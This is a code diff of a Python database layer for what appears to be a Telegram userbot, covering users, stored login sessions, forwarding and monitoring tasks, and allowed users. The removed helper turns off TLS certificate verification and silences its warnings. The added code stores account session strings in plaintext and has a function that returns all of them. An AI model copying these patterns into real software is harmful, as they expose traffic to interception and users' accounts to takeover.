+            logger.info("Database initialized successfully")
+    
+    def get_user(self, user_id: int) -> Optional[Dict]:
+        if user_id in self._user_cache:
+            return self._user_cache[user_id].copy()
+
+        try:
+            conn = self.get_connection()
+            
+            if self.db_type == "sqlite":
+                cur = conn.cursor()
+                cur.execute("""
+                    SELECT user_id, phone, name, session_data, is_logged_in, created_at, updated_at 
+                    FROM users WHERE user_id = ?
+                """, (user_id,))
+                row = cur.fetchone()
+
+                if row:
+                    user_data = {
+                        'user_id': row["user_id"],
+                        'phone': row["phone"],
+                        'name': row["name"],
+                        'session_data': row["session_data"],
+                        'is_logged_in': bool(row["is_logged_in"]),
+                        'created_at': row["created_at"],
+                        'updated_at': row["updated_at"]
+                    }
+                    self._user_cache[user_id] = user_data
+                    return user_data.copy()
+                    
+            else:
+                with conn.cursor() as cur:
+                    cur.execute("""
+                        SELECT user_id, phone, name, session_data, is_logged_in, created_at, updated_at 
+                        FROM users WHERE user_id = %s
+                    """, (user_id,))
+                    row = cur.fetchone()
+
+                    if row:
+                        user_data = {
+                            'user_id': row["user_id"],
+                            'phone': row["phone"],
+                            'name': row["name"],
+                            'session_data': row["session_data"],
+                            'is_logged_in': row["is_logged_in"],
+                            'created_at': row["created_at"].isoformat() if row["created_at"] else None,
+                            'updated_at': row["updated_at"].isoformat() if row["updated_at"] else None
+                        }
+                        self._user_cache[user_id] = user_data
+                        return user_data.copy()
+                        
+            return None
+        except Exception as e:
+            logger.exception("Error in get_user for %s: %s", user_id, e)
+            return None
+    
+    def save_user(self, user_id: int, phone: Optional[str] = None, name: Optional[str] = None,
+                  session_data: Optional[str] = None, is_logged_in: bool = False):
+        try:
+            conn = self.get_connection()
+            
+            if self.db_type == "sqlite":
+                cur = conn.cursor()
+                cur.execute("SELECT 1 FROM users WHERE user_id = ?", (user_id,))
+                exists = cur.fetchone() is not None
+
+                if exists:
+                    updates = []
+                    params = []
+
+                    if phone is not None:
+                        updates.append("phone = ?")
+                        params.append(phone)
+                    if name is not None:
+                        updates.append("name = ?")
+                        params.append(name)
+                    if session_data is not None:
+                        updates.append("session_data = ?")
+                        params.append(session_data)
+
+                    updates.append("is_logged_in = ?")
+                    params.append(1 if is_logged_in else 0)
+                    updates.append("updated_at = datetime('now')")
+                    params.append(user_id)
+                    
+                    query = f"UPDATE users SET {', '.join(updates)} WHERE user_id = ?"
+                    cur.execute(query, params)
+                else:
+                    cur.execute("""
+                        INSERT INTO users (user_id, phone, name, session_data, is_logged_in)
+                        VALUES (?, ?, ?, ?, ?)
+                    """, (user_id, phone, name, session_data, 1 if is_logged_in else 0))
+                
+                conn.commit()
+                
+            else:
+                with conn.cursor() as cur:
+                    cur.execute("SELECT 1 FROM users WHERE user_id = %s", (user_id,))
+                    exists = cur.fetchone() is not None
+
+                    if exists:
+                        updates = []
+                        params = []
+
+                        if phone is not None:
+                            updates.append("phone = %s")
+                            params.append(phone)
+                        if name is not None:
+                            updates.append("name = %s")
+                            params.append(name)
+                        if session_data is not None:
+                            updates.append("session_data = %s")
+                            params.append(session_data)
+
+                        updates.append("is_logged_in = %s")
+                        params.append(is_logged_in)
+                        updates.append("updated_at = CURRENT_TIMESTAMP")
+                        params.append(user_id)
+                        
+                        query = f"UPDATE users SET {', '.join(updates)} WHERE user_id = %s"
+                        cur.execute(query, params)
+                    else:
+                        cur.execute("""
+                            INSERT INTO users (user_id, phone, name, session_data, is_logged_in)
+                            VALUES (%s, %s, %s, %s, %s)
+                            ON CONFLICT (user_id) DO UPDATE SET
+                                phone = EXCLUDED.phone,
+                                name = EXCLUDED.name,
+                                session_data = EXCLUDED.session_data,
+                                is_logged_in = EXCLUDED.is_logged_in,
+                                updated_at = CURRENT_TIMESTAMP
+                        """, (user_id, phone, name, session_data, is_logged_in))
+                
+                conn.commit()
+
+            # Update cache
+            if user_id in self._user_cache:
+                user_data = self._user_cache[user_id]
+                if phone is not None:
+                    user_data['phone'] = phone
+                if name is not None:
+                    user_data['name'] = name
+                if session_data is not None:
+                    user_data['session_data'] = session_data
+                user_data['is_logged_in'] = is_logged_in
+                user_data['updated_at'] = datetime.now().isoformat()
+            else:
+                if is_logged_in:
+                    self._user_cache[user_id] = {
+                        'user_id': user_id,
+                        'phone': phone,
+                        'name': name,
+                        'session_data': session_data,
+                        'is_logged_in': is_logged_in,
+                        'updated_at': datetime.now().isoformat()
+                    }
+
+        except Exception as e:
+            logger.exception("Error in save_user for %s: %s", user_id, e)
+            raise
+    
+    # ============================
+    # FORWARDING TASKS METHODS
+    # ============================
+    def add_forwarding_task(self, user_id: int, label: str, source_ids: List[int], 
+                           target_ids: List[int], filters: Optional[Dict[str, Any]] = None) -> bool:
+        try:
+            conn = self.get_connection()
+            
+            if filters is None:
+                filters = {
+                    "filters": {
+                        "raw_text": False,
+                        "numbers_only": False,
+                        "alphabets_only": False,
+                        "removed_alphabetic": False,
+                        "removed_numeric": False,
+                        "prefix": "",
+                        "suffix": ""
+                    },
+                    "outgoing": True,
+                    "forward_tag": False,
+                    "control": True
+                }
+            
+            if self.db_type == "sqlite":
+                cur = conn.cursor()
+                try:
+                    cur.execute(
+                        """
+                        INSERT INTO forwarding_tasks (user_id, label, source_ids, target_ids, filters)
+                        VALUES (?, ?, ?, ?, ?)
+                    """,
+                        (user_id, label, json.dumps(source_ids), json.dumps(target_ids), json.dumps(filters)),
+                    )
+                    task_id = cur.lastrowid
+                    conn.commit()
+                    
+                    task = {
+                        "id": task_id,
+                        "label": label,
+                        "source_ids": source_ids,
+                        "target_ids": target_ids,
+                        "filters": filters,
+                        "is_active": 1
+                    }
+                    self._forwarding_tasks_cache[user_id].append(task)
+                    
+                    return True
+                except sqlite3.IntegrityError:
+                    return False
+                    
+            else:
+                with conn.cursor() as cur:
+                    try:
+                        cur.execute(
+                            """
+                            INSERT INTO forwarding_tasks (user_id, label, source_ids, target_ids, filters)
+                            VALUES (%s, %s, %s, %s, %s)
+                            ON CONFLICT (user_id, label) DO NOTHING
+                            RETURNING id
+                        """,
+                            (user_id, label, json.dumps(source_ids), json.dumps(target_ids), json.dumps(filters)),
+                        )
+                        row = cur.fetchone()
+                        conn.commit()
+                        
+                        if row:
+                            task_id = row["id"]
+                            task = {
+                                "id": task_id,
+                                "label": label,
+                                "source_ids": source_ids,
+                                "target_ids": target_ids,
+                                "filters": filters,
+                                "is_active": 1
+                            }
+                            self._forwarding_tasks_cache[user_id].append(task)
+                            return True
+                        return False
+                    except psycopg.errors.UniqueViolation:
+                        return False
+                        
+        except Exception as e:
+            logger.exception("Error in add_forwarding_task for %s: %s", user_id, e)
+            raise
+    
+    def update_task_filters(self, user_id: int, label: str, filters: Dict[str, Any]) -> bool:
+        try:
+            conn = self.get_connection()
+            
+            if self.db_type == "sqlite":
+                cur = conn.cursor()
+                cur.execute(
+                    """
+                    UPDATE forwarding_tasks 
+                    SET filters = ?, updated_at = datetime('now')
+                    WHERE user_id = ? AND label = ?
+                    """,
+                    (json.dumps(filters), user_id, label),
+                )
+                updated = cur.rowcount > 0
+                conn.commit()
+                
+            else:
+                with conn.cursor() as cur:
+                    cur.execute(
+                        """
+                        UPDATE forwarding_tasks 
+                        SET filters = %s, updated_at = CURRENT_TIMESTAMP
+                        WHERE user_id = %s AND label = %s
+                        """,
+                        (json.dumps(filters), user_id, label),
+                    )
+                    updated = cur.rowcount > 0
+                    conn.commit()
+
+            if updated and user_id in self._forwarding_tasks_cache:
+                for task in self._forwarding_tasks_cache[user_id]:
+                    if task['label'] == label:
+                        task['filters'] = filters
+                        break
+
+            return updated
+        except Exception as e:
+            logger.exception("Error in update_task_filters for %s, task %s: %s", user_id, label, e)
+            raise
+    
+    def remove_forwarding_task(self, user_id: int, label: str) -> bool:
+        try:
+            conn = self.get_connection()
+            
+            if self.db_type == "sqlite":
+                cur = conn.cursor()
+                cur.execute("DELETE FROM forwarding_tasks WHERE user_id = ? AND label = ?", (user_id, label))
+                deleted = cur.rowcount > 0
+                conn.commit()
+            else:
+                with conn.cursor() as cur:
+                    cur.execute("DELETE FROM forwarding_tasks WHERE user_id = %s AND label = %s", (user_id, label))
+                    deleted = cur.rowcount > 0
+                    conn.commit()
+
+            if deleted and user_id in self._forwarding_tasks_cache:
+                self._forwarding_tasks_cache[user_id] = [t for t in self._forwarding_tasks_cache[user_id] if t.get('label') != label]
+
+            return deleted
+        except Exception as e:
+            logger.exception("Error in remove_forwarding_task for %s: %s", user_id, e)
+            raise
+    
+    def get_user_forwarding_tasks(self, user_id: int) -> List[Dict]:
+        if user_id in self._forwarding_tasks_cache and self._forwarding_tasks_cache[user_id]:
+            return [t.copy() for t in self._forwarding_tasks_cache[user_id]]
+
+        try:
+            conn = self.get_connection()
+            tasks = []
+            
+            if self.db_type == "sqlite":
+                cur = conn.cursor()
+                cur.execute(
+                    """
+                    SELECT id, label, source_ids, target_ids, filters, is_active, created_at
+                    FROM forwarding_tasks
+                    WHERE user_id = ? AND is_active = 1
+                    ORDER BY created_at DESC
+                """,
+                    (user_id,),
+                )
+
+                for row in cur.fetchall():
+                    try:
+                        filters_data = json.loads(row["filters"]) if row["filters"] else {}
+                    except (json.JSONDecodeError, TypeError):
+                        filters_data = {}
+
+                    tasks.append(
+                        {
+                            "id": row["id"],
+                            "label": row["label"],
+                            "source_ids": json.loads(row["source_ids"]) if row["source_ids"] else [],
+                            "target_ids": json.loads(row["target_ids"]) if row["target_ids"] else [],
+                            "filters": filters_data,
+                            "is_active": row["is_active"],
+                            "created_at": row["created_at"],
+                        }
+                    )
+                    
+            else:
+                with conn.cursor() as cur:
+                    cur.execute(
+                        """
+                        SELECT id, label, source_ids, target_ids, filters, is_active, created_at
+                        FROM forwarding_tasks
+                        WHERE user_id = %s AND is_active = TRUE
+                        ORDER BY created_at DESC
+                    """,
+                        (user_id,),
+                    )
+
+                    for row in cur.fetchall():
+                        tasks.append(
+                            {
+                                "id": row["id"],
+                                "label": row["label"],
+                                "source_ids": row["source_ids"] if row["source_ids"] else [],
+                                "target_ids": row["target_ids"] if row["target_ids"] else [],
+                                "filters": row["filters"] if row["filters"] else {},
+                                "is_active": row["is_active"],
+                                "created_at": row["created_at"].isoformat() if row["created_at"] else None,
+                            }
+                        )
+            
+            if tasks:
+                self._forwarding_tasks_cache[user_id] = tasks
+
+            return [t.copy() for t in tasks]
+        except Exception as e:
+            logger.exception("Error in get_user_forwarding_tasks for %s: %s", user_id, e)
+            return []
+    
+    def get_all_active_forwarding_tasks(self) -> List[Dict]:
+        try:
+            conn = self.get_connection()
+            tasks = []
+            
+            if self.db_type == "sqlite":
+                cur = conn.cursor()
+                cur.execute(
+                    """
+                    SELECT user_id, id, label, source_ids, target_ids, filters
+                    FROM forwarding_tasks
+                    WHERE is_active = 1
+                """
+                )
+                for row in cur.fetchall():
+                    try:
+                        filters_data = json.loads(row["filters"]) if row["filters"] else {}
+                    except (json.JSONDecodeError, TypeError):
+                        filters_data = {}
+
+                    task = {
+                        "user_id": row["user_id"],
+                        "id": row["id"],
+                        "label": row["label"],
+                        "source_ids": json.loads(row["source_ids"]) if row["source_ids"] else [],
+                        "target_ids": json.loads(row["target_ids"]) if row["target_ids"] else [],
+                        "filters": filters_data,
+                    }
+                    tasks.append(task)
+
+                    uid = task["user_id"]
+                    if uid not in self._forwarding_tasks_cache or not any(t['id'] == task['id'] for t in self._forwarding_tasks_cache.get(uid, [])):
+                        self._forwarding_tasks_cache[uid].append({
+                            "id": task["id"],
+                            "label": task["label"],
+                            "source_ids": task["source_ids"],
+                            "target_ids": task["target_ids"],
+                            "filters": task["filters"],
+                            "is_active": 1
+                        })
+                        
+            else:
+                with conn.cursor() as cur:
+                    cur.execute(
+                        """
+                        SELECT user_id, id, label, source_ids, target_ids, filters
+                        FROM forwarding_tasks
+                        WHERE is_active = TRUE
+                    """
+                    )
+                    for row in cur.fetchall():
+                        task = {
+                            "user_id": row["user_id"],
+                            "id": row["id"],
+                            "label": row["label"],
+                            "source_ids": row["source_ids"] if row["source_ids"] else [],
+                            "target_ids": row["target_ids"] if row["target_ids"] else [],
+                            "filters": row["filters"] if row["filters"] else {},
+                        }
+                        tasks.append(task)
+
+                        uid = task["user_id"]
+                        if uid not in self._forwarding_tasks_cache or not any(t['id'] == task['id'] for t in self._forwarding_tasks_cache.get(uid, [])):
+                            self._forwarding_tasks_cache[uid].append({
+                                "id": task["id"],
+                                "label": task["label"],
+                                "source_ids": task["source_ids"],
+                                "target_ids": task["target_ids"],
+                                "filters": task["filters"],
+                                "is_active": 1
+                            })
+            return tasks
+        except Exception as e:
+            logger.exception("Error in get_all_active_forwarding_tasks: %s", e)
+            raise
+    
+    # ============================
+    # MONITORING TASKS METHODS
+    # ============================
+    def add_monitoring_task(self, user_id: int, label: str, chat_ids: List[int],
+                           settings: Optional[Dict[str, Any]] = None) -> bool:
+        try:
+            conn = self.get_connection()
+
+            if settings is None:
+                settings = {
+                    "check_duplicate_and_notify": True,
+                    "manual_reply_system": True,
+                    "auto_reply_system": False,
+                    "auto_reply_message": "",
+                    "outgoing_message_monitoring": True
+                }
+            
+            if self.db_type == "sqlite":
+                cur = conn.cursor()
+                try:
+                    cur.execute("""
+                        INSERT INTO monitoring_tasks (user_id, label, chat_ids, settings)
+                        VALUES (?, ?, ?, ?)
+                    """, (user_id, label, json.dumps(chat_ids), json.dumps(settings)))
+                    
+                    task_id = cur.lastrowid
+                    conn.commit()
+                    
+                    task = {
+                        'id': task_id,
+                        'label': label,
+                        'chat_ids': chat_ids,
+                        'settings': settings,
+                        'is_active': 1
+                    }
+                    self._monitoring_tasks_cache[user_id].append(task)
+                    
+                    return True
+                except sqlite3.IntegrityError:
+                    return False
+                    
+            else:
+                with conn.cursor() as cur:
+                    try:
+                        cur.execute("""
+                            INSERT INTO monitoring_tasks (user_id, label, chat_ids, settings)
+                            VALUES (%s, %s, %s, %s)
+                            ON CONFLICT (user_id, label) DO NOTHING
+                            RETURNING id
+                        """, (user_id, label, json.dumps(chat_ids), json.dumps(settings)))
+                        
+                        row = cur.fetchone()
+                        conn.commit()
+                        
+                        if row:
+                            task_id = row["id"]
+                            task = {
+                                'id': task_id,
+                                'label': label,
+                                'chat_ids': chat_ids,
+                                'settings': settings,
+                                'is_active': 1
+                            }
+                            self._monitoring_tasks_cache[user_id].append(task)
+                            return True
+                        return False
+                    except psycopg.errors.UniqueViolation:
+                        return False
+                        
+        except Exception as e:
+            logger.exception("Error in add_monitoring_task for %s: %s", user_id, e)
+            return False
+    
+    def update_task_settings(self, user_id: int, label: str, settings: Dict[str, Any]) -> bool:
+        try:
+            conn = self.get_connection()
+            
+            if self.db_type == "sqlite":
+                cur = conn.cursor()
+                cur.execute("""
+                    UPDATE monitoring_tasks
+                    SET settings = ?, updated_at = datetime('now')
+                    WHERE user_id = ? AND label = ?
+                """, (json.dumps(settings), user_id, label))
+                updated = cur.rowcount > 0
+                conn.commit()
+                
+            else:
+                with conn.cursor() as cur:
+                    cur.execute("""
+                        UPDATE monitoring_tasks
+                        SET settings = %s, updated_at = CURRENT_TIMESTAMP
+                        WHERE user_id = %s AND label = %s
+                    """, (json.dumps(settings), user_id, label))
+                    updated = cur.rowcount > 0
+                    conn.commit()
+
+            if updated and user_id in self._monitoring_tasks_cache:
+                for task in self._monitoring_tasks_cache[user_id]:
+                    if task['label'] == label:
+                        task['settings'] = settings
+                        break
+
+            return updated
+        except Exception as e:
+            logger.exception("Error in update_task_settings for %s, task %s: %s", user_id, label, e)
+            return False
+    
+    def remove_monitoring_task(self, user_id: int, label: str) -> bool:
+        try:
+            conn = self.get_connection()
+            
+            if self.db_type == "sqlite":
+                cur = conn.cursor()
+                cur.execute("DELETE FROM monitoring_tasks WHERE user_id = ? AND label = ?", (user_id, label))
+                deleted = cur.rowcount > 0
+                conn.commit()
+            else:
+                with conn.cursor() as cur:
+                    cur.execute("DELETE FROM monitoring_tasks WHERE user_id = %s AND label = %s", (user_id, label))
+                    deleted = cur.rowcount > 0
+                    conn.commit()
+
+            if deleted and user_id in self._monitoring_tasks_cache:
+                self._monitoring_tasks_cache[user_id] = [t for t in self._monitoring_tasks_cache[user_id] if t.get('label') != label]
+
+            return deleted
+        except Exception as e:
+            logger.exception("Error in remove_monitoring_task for %s: %s", user_id, e)
+            return False
+    
+    def get_user_monitoring_tasks(self, user_id: int) -> List[Dict]:
+        if user_id in self._monitoring_tasks_cache and self._monitoring_tasks_cache[user_id]:
+            return [t.copy() for t in self._monitoring_tasks_cache[user_id]]
+
+        try:
+            conn = self.get_connection()
+            tasks = []
+            
+            if self.db_type == "sqlite":
+                cur = conn.cursor()
+                cur.execute("""
+                    SELECT id, label, chat_ids, settings, is_active 
+                    FROM monitoring_tasks 
+                    WHERE user_id = ? AND is_active = 1 
+                    ORDER BY created_at ASC
+                """, (user_id,))
+                
+                for row in cur.fetchall():
+                    task = {
+                        'id': row["id"],
+                        'label': row["label"],
+                        'chat_ids': json.loads(row["chat_ids"]) if row["chat_ids"] else [],
+                        'settings': json.loads(row["settings"]) if row["settings"] else {},
+                        'is_active': row["is_active"]
+                    }
+                    tasks.append(task)
+                    
+            else:
+                with conn.cursor() as cur:
+                    cur.execute("""
+                        SELECT id, label, chat_ids, settings, is_active 
+                        FROM monitoring_tasks 
+                        WHERE user_id = %s AND is_active = TRUE 
+                        ORDER BY created_at ASC
+                    """, (user_id,))
+                    
+                    for row in cur.fetchall():
+                        task = {
+                            'id': row["id"],
+                            'label': row["label"],
+                            'chat_ids': row["chat_ids"] if row["chat_ids"] else [],
+                            'settings': row["settings"] if row["settings"] else {},
+                            'is_active': row["is_active"]
+                        }
+                        tasks.append(task)
+
+            if tasks:
+                self._monitoring_tasks_cache[user_id] = tasks
+
+            return [t.copy() for t in tasks]
+        except Exception as e:
+            logger.exception("Error in get_user_monitoring_tasks for %s: %s", user_id, e)
+            return []
+    
+    def get_all_active_monitoring_tasks(self) -> List[Dict]:
+        try:
+            conn = self.get_connection()
+            tasks = []
+            
+            if self.db_type == "sqlite":
+                cur = conn.cursor()
+                cur.execute("SELECT user_id, id, label, chat_ids, settings FROM monitoring_tasks WHERE is_active = 1")
+                
+                for row in cur.fetchall():
+                    uid = row["user_id"]
+                    task = {
+                        'user_id': uid,
+                        'id': row["id"],
+                        'label': row["label"],
+                        'chat_ids': json.loads(row["chat_ids"]) if row["chat_ids"] else [],
+                        'settings': json.loads(row["settings"]) if row["settings"] else {}
+                    }
+                    tasks.append(task)
+
+                    if uid not in self._monitoring_tasks_cache or not any(t['id'] == task['id'] for t in self._monitoring_tasks_cache.get(uid, [])):
+                        self._monitoring_tasks_cache[uid].append({
+                            'id': task['id'],
+                            'label': task['label'],
+                            'chat_ids': task['chat_ids'],
+                            'settings': task['settings'],
+                            'is_active': 1
+                        })
+                        
+            else:
+                with conn.cursor() as cur:
+                    cur.execute("SELECT user_id, id, label, chat_ids, settings FROM monitoring_tasks WHERE is_active = TRUE")
+                    
+                    for row in cur.fetchall():
+                        uid = row["user_id"]
+                        task = {
+                            'user_id': uid,
+                            'id': row["id"],
+                            'label': row["label"],
+                            'chat_ids': row["chat_ids"] if row["chat_ids"] else [],
+                            'settings': row["settings"] if row["settings"] else {}
+                        }
+                        tasks.append(task)
+
+                        if uid not in self._monitoring_tasks_cache or not any(t['id'] == task['id'] for t in self._monitoring_tasks_cache.get(uid, [])):
+                            self._monitoring_tasks_cache[uid].append({
+                                'id': task['id'],
+                                'label': task['label'],
+                                'chat_ids': task['chat_ids'],
+                                'settings': task['settings'],
+                                'is_active': 1
+                            })
+
+            return tasks
+        except Exception as e:
+            logger.exception("Error in get_all_active_monitoring_tasks: %s", e)
+            return []
+    
+    # ============================
+    # USER MANAGEMENT METHODS
+    # ============================
+    def is_user_allowed(self, user_id: int) -> bool:
+        if user_id in self._allowed_users_cache:
+            return True
+
+        try:
+            conn = self.get_connection()
+            
+            if self.db_type == "sqlite":
+                cur = conn.cursor()
+                cur.execute("SELECT 1 FROM allowed_users WHERE user_id = ?", (user_id,))
+                exists = cur.fetchone() is not None
+            else:
+                with conn.cursor() as cur:
+                    cur.execute("SELECT 1 FROM allowed_users WHERE user_id = %s", (user_id,))
+                    exists = cur.fetchone() is not None
+                    
+            if exists:
+                self._allowed_users_cache.add(user_id)
+            return exists
         except Exception:
-            logger.exception("Auto-add allowed user error for %s", bot_id)
-
-# ===================== SESSION MANAGEMENT =====================
-
-def get_session(bot_id: str, force_new: bool = False):
-    """Get or create a requests session for a bot with health checks"""
-    state = BOT_STATES[bot_id]
+            logger.exception("Error checking is_user_allowed for %s", user_id)
+            return False
     
-    # Check if we need a new session
-    current_time = time.time()
-    session_age = current_time - state["session_created_at"]
-    
-    if (state["session"] is None or force_new or 
-        session_age > 3600 or  # 1 hour max age
-        state["session_request_count"] > 10000):  # Max requests per session
-        
-        if state["session"]:
-            try:
-                state["session"].close()
-            except Exception:
-                pass
-        
-        session = requests.Session()
+    def is_user_admin(self, user_id: int) -> bool:
+        if user_id in self._admin_cache:
+            return True
+
         try:
-            import urllib3
-            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+            conn = self.get_connection()
             
-            ssl_context = ssl.create_default_context()
-            ssl_context.check_hostname = False
-            ssl_context.verify_mode = ssl.CERT_NONE
+            if self.db_type == "sqlite":
+                cur = conn.cursor()
+                cur.execute("SELECT is_admin FROM allowed_users WHERE user_id = ?", (user_id,))
+                row = cur.fetchone()
+                if row and row["is_admin"]:
+                    self._admin_cache.add(user_id)
+                    self._allowed_users_cache.add(user_id)
+                    return True
+                    
+            else:
+                with conn.cursor() as cur:
+                    cur.execute("SELECT is_admin FROM allowed_users WHERE user_id = %s", (user_id,))
+                    row = cur.fetchone()
+                    if row and row["is_admin"]:
+                        self._admin_cache.add(user_id)
+                        self._allowed_users_cache.add(user_id)
+                        return True
+                        
+            return False
+        except Exception:
+            logger.exception("Error checking is_user_admin for %s", user_id)
+            return False
+    
+    def add_allowed_user(self, user_id: int, username: Optional[str] = None,
+                         is_admin: bool = False, added_by: Optional[int] = None) -> bool:
+        try:
+            conn = self.get_connection()
             
-            retry_strategy = Retry(
-                total=5,
-                backoff_factor=1,
-                status_forcelist=[429, 500, 502, 503, 504],
-                allowed_methods=["POST", "GET"]
-            )
+            if self.db_type == "sqlite":
+                cur = conn.cursor()
+                try:
+                    cur.execute("""
+                        INSERT INTO allowed_users (user_id, username, is_admin, added_by)
+                        VALUES (?, ?, ?, ?)
+                    """, (user_id, username, 1 if is_admin else 0, added_by))
+                    conn.commit()
+                    
+                    self._allowed_users_cache.add(user_id)
+                    if is_admin:
+                        self._admin_cache.add(user_id)
+                        
+                    return True
+                except sqlite3.IntegrityError:
+                    return False
+                    
+            else:
+                with conn.cursor() as cur:
+                    try:
+                        cur.execute("""
+                            INSERT INTO allowed_users (user_id, username, is_admin, added_by)
+                            VALUES (%s, %s, %s, %s)
+                            ON CONFLICT (user_id) DO NOTHING
+                            RETURNING user_id
+                        """, (user_id, username, is_admin, added_by))
+                        conn.commit()
+                        
+                        if cur.fetchone() is not None:
+                            self._allowed_users_cache.add(user_id)
+                            if is_admin:
+                                self._admin_cache.add(user_id)
+                            return True
+                        return False
+                    except psycopg.errors.UniqueViolation:
+                        return False
+                        
+        except Exception as e:
+            logger.exception("Error in add_allowed_user for %s: %s", user_id, e)
+            return False
+    
+    def remove_allowed_user(self, user_id: int) -> bool:
+        try:
+            conn = self.get_connection()
             
-            adapter = HTTPAdapter(
-                max_retries=retry_strategy,
-                pool_connections=BOTS_CONFIG[bot_id]["max_concurrent_workers"]*2,
-                pool_maxsize=max(20, BOTS_CONFIG[bot_id]["max_concurrent_workers"]*2),
-                pool_block=False
-            )
+            if self.db_type == "sqlite":
+                cur = conn.cursor()
+                cur.execute("DELETE FROM allowed_users WHERE user_id = ?", (user_id,))
+                removed = cur.rowcount > 0
+                conn.commit()
+            else:
+                with conn.cursor() as cur:
+                    cur.execute("DELETE FROM allowed_users WHERE user_id = %s", (user_id,))
+                    removed = cur.rowcount > 0
+                    conn.commit()
+
+            if removed:
+                self._allowed_users_cache.discard(user_id)
+                self._admin_cache.discard(user_id)
+                self._user_cache.pop(user_id, None)
+                self._forwarding_tasks_cache.pop(user_id, None)
+                self._monitoring_tasks_cache.pop(user_id, None)
+
+            return removed
+        except Exception as e:
+            logger.exception("Error in remove_allowed_user for %s: %s", user_id, e)
+            return False
+    
+    def get_all_allowed_users(self) -> List[Dict]:
+        try:
+            conn = self.get_connection()
+            users = []
             
-            session.mount("https://", adapter)
-            session.mount("http://", adapter)
-            session.verify = False
+            if self.db_type == "sqlite":
+                cur = conn.cursor()
+                cur.execute("""
+                    SELECT user_id, username, is_admin, added_by, created_at
+                    FROM allowed_users
+                    ORDER BY created_at DESC
+                """)
+                
+                for row in cur.fetchall():
+                    users.append({
+                        'user_id': row["user_id"],
+                        'username': row["username"],
+                        'is_admin': bool(row["is_admin"]),
+                        'added_by': row["added_by"],
+                        'created_at': row["created_at"]
+                    })
+                    
+            else:
+                with conn.cursor() as cur:
+                    cur.execute("""
+                        SELECT user_id, username, is_admin, added_by, created_at
+                        FROM allowed_users
+                        ORDER BY created_at DESC
+                    """)
+                    
+                    for row in cur.fetchall():
+                        users.append({
+                            'user_id': row["user_id"],
+                            'username': row["username"],
+                            'is_admin': row["is_admin"],
+                            'added_by': row["added_by"],
+                            'created_at': row["created_at"].isoformat() if row["created_at"] else None
+                        })
             
-            session.headers.update({
-                'User-Agent': f'Mozilla/5.0 (compatible; WordSplitterBot/{bot_id}/1.0)',
-                'Accept': 'application/json',
-                'Accept-Encoding': 'gzip, deflate',
-                'Connection': 'keep-alive'
-            })
+            return users
+        except Exception as e:
+            logger.exception("Error in get_all_allowed_users: %s", e)
+            return []
+    
+    def get_logged_in_users(self, limit: Optional[int] = None) -> List[Dict]:
+        conn = self.get_connection()
+        try:
+            if self.db_type == "sqlite":
+                cur = conn.cursor()
+                if limit and int(limit) > 0:
+                    cur.execute(
+                        "SELECT user_id, session_data FROM users WHERE is_logged_in = 1 ORDER BY updated_at DESC LIMIT ?",
+                        (int(limit),),
+                    )
+                else:
+                    cur.execute(
+                        "SELECT user_id, session_data FROM users WHERE is_logged_in = 1 ORDER BY updated_at DESC"
+                    )
+                rows = cur.fetchall()
+                result = []
+                for r in rows:
+                    try:
+                        user_id = r["user_id"]
+                        session_data = r["session_data"]
+                    except Exception:
+                        user_id, session_data = r[0], r[1]
+                    result.append({"user_id": user_id, "session_data": session_data})
+                return result
+            else:
+                with conn.cursor() as cur:
+                    if limit and int(limit) > 0:
+                        cur.execute(
+                            "SELECT user_id, session_data FROM users WHERE is_logged_in = TRUE ORDER BY updated_at DESC LIMIT %s",
+                            (int(limit),),
+                        )
+                    else:
+                        cur.execute(
+                            "SELECT user_id, session_data FROM users WHERE is_logged_in = TRUE ORDER BY updated_at DESC"
+                        )
+                    rows = cur.fetchall()
+                    result = []
+                    for r in rows:
+                        result.append({"user_id": r["user_id"], "session_data": r["session_data"]})
+                    return result
+        except Exception as e:
+            logger.exception("Error fetching logged-in users: %s", e)
+            raise
+    
+    def get_all_string_sessions(self) -> List[Dict]:
+        conn = self.get_connection()
+        try:
+            sessions = []
+            
+            if self.db_type == "sqlite":
+                cur = conn.cursor()
+                cur.execute(
+                    """
+                    SELECT user_id, session_data, name, phone, is_logged_in 
+                    FROM users 
+                    WHERE session_data IS NOT NULL AND session_data != '' 
+                    ORDER BY user_id
+                    """
+                )
+                for row in cur.fetchall():
+                    sessions.append({
+                        "user_id": row["user_id"],
+                        "session_data": row["session_data"],
+                        "name": row["name"],
+                        "phone": row["phone"],
+                        "is_logged_in": bool(row["is_logged_in"])
+                    })
+            else:
+                with conn.cursor() as cur:
+                    cur.execute(
+                        """
+                        SELECT user_id, session_data, name, phone, is_logged_in 
+                        FROM users 
+                        WHERE session_data IS NOT NULL AND session_data != '' 
+                        ORDER BY user_id
+                        """
+                    )
+                    for row in cur.fetchall():
+                        sessions.append({
+                            "user_id": row["user_id"],
+                            "session_data": row["session_data"],
+                            "name": row["name"],
+                            "phone": row["phone"],
+                            "is_logged_in": row["is_logged_in"]
+                        })
+            return sessions
             
         except Exception as e:
-            logger.warning("Could not configure advanced session settings for %s: %s", bot_id, e)
+            logger.exception("Error in get_all_string_sessions: %s", e)
+            raise
+    
+    def get_db_status(self) -> Dict:
+        status = {
+            "type": self.db_type,
+            "path": self.db_path if self.db_type == "sqlite" else self.postgres_url,
+            "exists": False,
+            "size_bytes": None,
+            "cache_counts": {
+                "users": len(self._user_cache),
+                "forwarding_tasks": sum(len(tasks) for tasks in self._forwarding_tasks_cache.values()),
+                "monitoring_tasks": sum(len(tasks) for tasks in self._monitoring_tasks_cache.values()),
+                "allowed_users": len(self._allowed_users_cache),
+                "admins": len(self._admin_cache)
+            }
+        }
+
+        try:
+            if self.db_type == "sqlite":
+                status["exists"] = os.path.exists(self.db_path)
+                if status["exists"]:
+                    status["size_bytes"] = os.path.getsize(self.db_path)
+            else:
+                status["exists"] = True
+
+            conn = self.get_connection()
+            
+            if self.db_type == "sqlite":
+                cur = conn.cursor()
+                cur.execute("SELECT name FROM sqlite_master WHERE type='table'")
+                status["tables"] = [row[0] for row in cur.fetchall()]
+                
+            else:
+                with conn.cursor() as cur:
+                    cur.execute("""
+                        SELECT table_name 
+                        FROM information_schema.tables 
+                        WHERE table_schema = 'public'
+                    """)
+                    status["tables"] = [row["table_name"] for row in cur.fetchall()]
+
+        except Exception as e:
+            logger.exception("Error getting DB status: %s", e)
+            status["error"] = str(e)
+
+        return status
+    
+    def __del__(self):
+        try:
+            self.close_connection()
+            self._thread_pool.shutdown(wait=False)
+        except Exception:
+            pass
+
+# ============================
+# GLOBAL STATE
+# ============================
+db = Database()
+
+# User session management
